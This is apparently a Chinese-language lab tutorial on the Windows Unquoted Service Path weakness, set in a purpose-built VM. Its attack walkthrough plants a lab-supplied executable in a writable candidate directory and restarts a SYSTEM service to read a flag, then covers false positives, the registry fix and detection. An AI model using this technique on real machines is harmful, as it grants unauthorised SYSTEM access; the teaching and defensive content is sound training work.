# Day 18：Unquoted Service Path — Windows 到底會先執行哪個 EXE？

### 場景準備

```powershell
# 1. 以 fei-labadmin 登入，系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W03-UNQUOTED-PATH
.\fei-setup.ps1
.\fei-verify.ps1
# 應看到 FEI-W03 STATUS: READY

# 2. 登出，改以 fei-student 登入（密碼：FEI-Student-2026!）
```

---

## 開場情境

IT 團隊汲取了教訓。Service ACL 修好了（W01 blocked）。Binary ACL 也修好了（W02 blocked）。

你試了所有方法：`sc config` 被拒、`icacls` 顯示 exe 只有 `(RX)`。

但你注意到一件事。`sc qc` 的輸出中，`BINARY_PATH_NAME` 長這樣：

```
BINARY_PATH_NAME   : C:\FEI Training\W03 App\FEIService.exe
```

路徑裡有空格。**而且沒有引號。**

這代表什麼？

---

## 今天要解決的問題

1. Windows 的 `CreateProcess` 遇到有空格的路徑時怎麼處理？
2. Unquoted Service Path 的四個必要條件是什麼？
3. 掃描器報告 Unquoted Path 就代表可以提權嗎？
4. W01、W02、W03 到底各自攻擊了什麼？

---

## 背景知識：ImagePath 和引號

### Service 的 ImagePath

每個 Service 的可執行檔路徑存在 Registry：

```
HKLM\SYSTEM\CurrentControlSet\Services\<name>\ImagePath
```

安全的設定（有引號）：

```
"C:\FEI Training\W03 App\FEIService.exe"
```

不安全的設定（沒有引號）：

```
C:\FEI Training\W03 App\FEIService.exe
```

---

## OS 原理：CreateProcess 的路徑解析

### 為什麼引號很重要？

當 SCM 啟動 Service 時，它呼叫 Windows 的 `CreateProcess()` API。

**有引號時**：`CreateProcess` 知道完整路徑是 `C:\FEI Training\W03 App\FEIService.exe`，沒有歧義。

**沒有引號時**：`CreateProcess` 看到空格就不確定「路徑到底到哪裡結束、參數從哪裡開始」。

### CreateProcess 的解析步驟

![CreateProcess 的解析步驟](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day18-unquoted-path-diagram-01.png)


對於 `C:\FEI Training\W03 App\FEIService.exe`，Windows 依序嘗試：


### 攻擊的機會

如果攻擊者能在**任何一個候選位置**建立 exe，Windows 就會先執行它。

```
C:\FEI Training\W03 App\FEIService.exe  ← 真正的 Service exe
C:\FEI Training\W03.exe                 ← 攻擊者建立的！
C:\FEI.exe                              ← 攻擊者建立的！（如果 C:\ 可寫）
```

---

## FEI Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
Scenario: FEI-W03-UNQUOTED-PATH
Service: FEIUnquotedPathService (LocalSystem)
ImagePath: C:\FEI Training\W03 App\FEIService.exe（故意沒有引號）
Flag: C:\FEI-PrivEsc\Flags\fei-w03-system-flag.txt
```

### ACL 設計（精確控制）

| 位置 | ACL | 說明 |
|------|-----|------|
| `C:\` | 預設（Users 不可寫）| C:\FEI.exe 不可行 |
| `C:\FEI Training\` | Users: **CreateFiles** | ✅ 可建立 W03.exe |
| `C:\FEI Training\W03 App\` | Users: ReadAndExecute | exe 不可替換（W02 blocked）|
| `C:\FEI Training\W03 App\FEIService.exe` | Users: ReadAndExecute | 安全 |

---

## 四個必要條件

![Unquoted Path 四個必要條件](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day18-unquoted-path-diagram-02.png)


Unquoted Service Path 要能被利用，**四個條件缺一不可**：


---

## 攻擊流程（Actual Output）

### Step 1：查詢 Service

```cmd
sc qc FEIUnquotedPathService
```

```
BINARY_PATH_NAME   : C:\FEI Training\W03 App\FEIService.exe
SERVICE_START_NAME : LocalSystem
```

> 路徑有空格、沒有引號、以 SYSTEM 執行。

### Step 2：嘗試 W01（被擋）

```cmd
sc config FEIUnquotedPathService binPath= "test"
```

```
存取被拒。
```

### Step 3：嘗試 W02（被擋）

```cmd
icacls "C:\FEI Training\W03 App\FEIService.exe"
```

```
Users:(RX)
```

> exe 不可寫。

### Step 4：檢查候選位置

```cmd
icacls "C:\FEI Training"
```

```
BUILTIN\Users:(S,WD)
```

> `(S,WD)` — Users 可以在這個目錄建立新檔案！

### Step 5：建立候選 exe

```cmd
sc stop FEIUnquotedPathService
copy "C:\FEI-PrivEsc\Training\W03\tools\fei-payload-helper.exe" "C:\FEI Training\W03.exe"
sc start FEIUnquotedPathService
```

### Step 6：讀取 Flag

```cmd
type "C:\Users\Public\fei-w03-proof.txt"
```

```
========================================
 FEI PrivEsc Lab — SYSTEM Proof
========================================
Executed as: SYSTEM
Scenario: FEI-W03-UNQUOTED-PATH
Flag: FEI{WINDOWS_W03_UNQUOTED_PATH_SYSTEM_ACCESS}
```

---

## Attack Path

![Unquoted Path Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day18-unquoted-path-diagram-03.png)



---

## False Positive 分析

### 掃描器報告 Unquoted Path = 漏洞？

**不一定。** 這是最常見的 False Positive 之一。

掃描器（如 PowerUp、winPEAS）會列出所有含空格且無引號的 Service ImagePath。但大部分都不可利用：

| 檢查 | 如果不滿足 |
|------|-----------|
| ImagePath 有空格 | 沒空格就沒有歧義 |
| ImagePath 沒引號 | 有引號就沒問題 |
| 候選位置可寫 | `C:\Program Files` 預設不可寫 |
| Service 以高權限執行 | LocalService 權限有限 |

> 真實環境中，大多數 Unquoted Path 報告無法利用，因為 `C:\Program Files\` 不允許一般使用者寫入。只有非標準安裝路徑或自訂 ACL 才可能形成真正的攻擊面。

### 常見 False Positive 數據

根據經驗，掃描器報告的 Unquoted Path 中：

- ~80% 路徑在 `C:\Program Files\`（不可寫）
- ~10% 路徑沒有空格（掃描器過度報告）
- ~5% Service 不以高權限執行
- **~5% 真正可利用**

---

## Edge Case

### SafeDllSearchMode 與 Unquoted Path

`SafeDllSearchMode` 影響的是 DLL 搜尋（Day 24），不影響 CreateProcess 的路徑解析。Unquoted Path 的行為在所有 Windows 版本上一致。

### Windows Server vs Desktop

行為相同。但 Server 上通常有更多第三方 Service 安裝在非標準路徑，增加了 Unquoted Path 的可能性。

### 只有一個空格的路徑

```
C:\My App\service.exe
```

候選：`C:\My.exe`。只有一個候選位置，但 `C:\` 通常不可寫。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| `copy` 到候選位置被拒 | 目錄 ACL 不允許 | 用 `icacls` 確認 |
| Service 啟動後仍然執行原始 exe | 候選位置的路徑名稱不對 | 精確計算空格分割位置 |
| C:\FEI.exe 不可行 | C:\ 預設不可寫 | 嘗試下一個候選 |

---

## 防禦（Defense）

### Root Cause

Service 的 ImagePath 在 Registry 中沒有引號。

### 修復

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<name>" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\FEI Training\W03 App\FEIService.exe\"" /f
```

或直接在 services.msc 中確認路徑有引號。

### 預防

- 安裝軟體時確認 ImagePath 正確引用
- 使用不含空格的安裝路徑（如 `C:\FEIService\`）
- 定期掃描：

```powershell
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notmatch '^"' -and $_.PathName -match ' '
} | Select-Object Name, PathName, StartName
```

---

## Detection

| 偵測點 | 方法 |
|--------|------|
| 新檔案建立在非標準位置 | File Integrity Monitoring |
| Candidate exe 出現在 Service 路徑的中間目錄 | 監控特定路徑 |
| ImagePath Registry 被修改（修復時） | Event ID 4657 |

---

## Fix Verification

修復後驗證：

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\FEIUnquotedPathService" /v ImagePath
```

確認值以 `"` 開頭和結尾。

---

## W01 vs W02 vs W03 完整對照

| | W01 | W02 | W03 |
|---|---|---|---|
| **弱點位置** | Service Object ACL | Binary File ACL | ImagePath + 目錄 ACL |
| **攻擊動作** | sc config binPath= | 替換 exe | 建立候選 exe |
| **檢查指令** | sc sdshow | icacls exe | icacls 候選目錄 |
| **前提** | CHANGE_CONFIG | Binary 可寫 | 路徑有空格、無引號、目錄可寫 |
| **修復** | 移除 BU 的 DC | 修復 NTFS ACL | 加引號 |

---

## Exercise

### 練習：計算候選路徑

以下 ImagePath 有幾個候選位置？

```
C:\Program Files\FEI Labs\PrivEsc Tool\service.exe
```

### 解答

三個候選：
1. `C:\Program.exe`
2. `C:\Program Files\FEI.exe`
3. `C:\Program Files\FEI Labs\PrivEsc.exe`

然後是完整路徑 `C:\Program Files\FEI Labs\PrivEsc Tool\service.exe`。

但 `C:\Program Files\` 預設不可寫，所以除非 ACL 被修改，這些候選都不可利用。


---

## Quiz

**Q1**: 為什麼大多數 Unquoted Service Path 無法利用？

A. Windows 已經修補了這個漏洞
B. `C:\Program Files\` 預設不允許一般使用者寫入
C. Service 都不以 SYSTEM 執行
D. 現代 Windows 會自動加引號

### 答案B。大多數 Service 安裝在 `C:\Program Files\`，該目錄的 ACL 只允許 Administrators 寫入。所以即使路徑有空格且無引號，攻擊者也無法建立候選 exe。



## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W03-UNQUOTED-PATH
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W03-UNQUOTED-PATH STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Unquoted + Spaces + Writable Candidate + High Privilege = 四個條件缺一不可**。只有全部滿足才能利用。
2. **掃描器報告 Unquoted Path 不代表漏洞**。大多數是 False Positive，因為標準安裝路徑通常不可寫。
3. **修復很簡單**：在 Registry 的 ImagePath 加上引號。預防更簡單：安裝路徑不要有空格。

---

## 給自己的問題

> 到目前為止，W01/W02/W03 都是利用 Windows Service 的不同面向。如果 Service 完全安全，但系統有一個 **Scheduled Task** 以 SYSTEM 執行你能控制的檔案呢？

---

## 下一篇

Day 19：Scheduled Task — 當 SYSTEM 定期執行你能控制的檔案
